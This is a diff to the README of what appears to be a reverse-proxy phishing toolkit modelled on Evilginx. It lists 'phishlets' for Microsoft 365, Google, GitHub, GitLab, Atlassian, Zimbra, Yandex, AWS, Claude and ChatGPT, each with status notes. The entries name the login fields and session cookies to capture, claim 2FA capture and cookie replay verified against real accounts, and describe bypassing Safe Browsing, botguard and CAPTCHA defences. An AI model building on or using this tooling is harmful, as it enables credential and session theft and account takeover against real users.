@@ -20,7 +20,14 @@ Evilginx Pro-class features clean-room for internal / air-gapped environments.
 |---|---|
 | `ms365` | ✅ production-ready — work + consumer capture, mailbox reuse, token-gate, CSD hardening (Safe Browsing bypass field-verified) |
 | `google` | ✅ production-ready via **real-browser relay** — defeats origin-bound botguard; real-account capture with number-match 2FA; cookie replay into Gmail verified |
-| `github` | 🧪 in testing — login + TOTP (`otp`) capture, `user_session` + `__Host-user_session_same_site` tokens, CSP stripped, auto-filter rewriting; login-leg capture verified end-to-end, 2FA leg awaiting a test account |
+| `github` | ✅ production-ready — login + 2FA capture **verified E2E with a real account** (GitHub-Mobile push 2FA); tokens `__Host-user_session_same_site` + `_gh_sess` (modern GitHub dropped domain-wide `user_session`); TOTP-entry capture in place, untested |
+| `gitlab` | ⚠️ unverified — Cloudflare Turnstile sits in front of the login (render passes through the phishing host); fields `user[login]/user[password]/user[otp_attempt]` |
+| `atlassian` | ⚠️ unverified — SPA renders through the proxy (`username`/`password` JSON creds); AWS WAF SDK + reCAPTCHA cross-origin not yet proxied |
+| `zimbra` | ⚠️ unverified — on-prem template with required `{domain}` param; classic fields `username`/`password`, token `ZM_AUTH_TOKEN` |
+| `yandex` | ⚠️ unverified — landing `/auth/` currently bounces to 360.yandex.com marketing; React login fields need re-checking with an account |
+| `aws` | ⚠️ unverified — AWS WAF 403s datacenter IPs at `/signin`; fields `username`/`password`/`mfaCode` |
+| `claude` | ⚠️ unverified — Cloudflare challenge in front; Anthropic-account login `email`/`password`, session `sessionKey` |
+| `chatgpt` | ⚠️ unverified — Cloudflare + Auth0 flow (`auth.openai.com/u/login/password`); session `__Secure-next-auth.session-token` |
 
 ### ClickFix templates
 
@@ -101,7 +108,7 @@ Next:
 
 - [ ] Fleet console — unified multi-node view (sessions + lures across nodes)
 - [ ] HTTP/2 Akamai TLS fingerprint for botguard
-- [ ] Phishlets: `gitlab` (GitLab.com + self-hosted, TOTP), `atlassian` (Atlassian account / Jira-Confluence SSO), `zimbra` (Zimbra webmail — on-prem targets), `yandex` (Yandex ID + Yandex Mail)
+- [ ] Verify the unverified phishlets above with test accounts (gitlab, atlassian, zimbra, yandex, aws, claude, chatgpt)
 
 Deferred (not a current threat-model blocker):
 
